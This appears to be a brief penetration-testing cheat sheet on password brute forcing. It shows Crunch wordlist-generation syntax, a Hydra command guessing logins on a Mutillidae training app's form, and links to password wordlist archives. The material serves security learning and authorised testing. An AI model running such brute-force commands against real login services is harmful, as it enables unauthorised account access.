# Brute Force

## Crunch (Wordlist generator)
- Syntax
  - ```crunch [min]  [max] [characters] -t [pattern] -o [filename]```
- Example
  - ```crunch 6 8 123abc$ -i wordlist -t a@@@@b```
  - ```crunch 6 8 abc12 -o test.txt```

## Hydra (Brute force)
- Syntax
  - ```hydra [ip]  -l [usernames] -P [passwords] [service]```

- Example 
  - ```cmd hydra 10.20.14.212 -l admin -P /root/test.txt http-post-form "/mutillidae/index.php?page=login.php:username=^USER^&password=^PASS^&login-php-submit-button=Login:F=Not Logged In"```

## Burp is the Best tool !

## Wordlists
- ftp://ftp.openwall.com/pub/wordlists/
- https://github.com/berzerk0/Probable-Wordlists
- http://www.openwall.com/mirrors/
- http://www.outpost9.com/files/WordLists.html
- http://www.vulnerabilityassessment.co.uk/passwords.htm
- http://packetstormsecurity.org/Crackers/wordlists/
- http://www.ai.uga.edu/ftplib/natural-language/moby/
- http://wordlist.sourceforge.net/
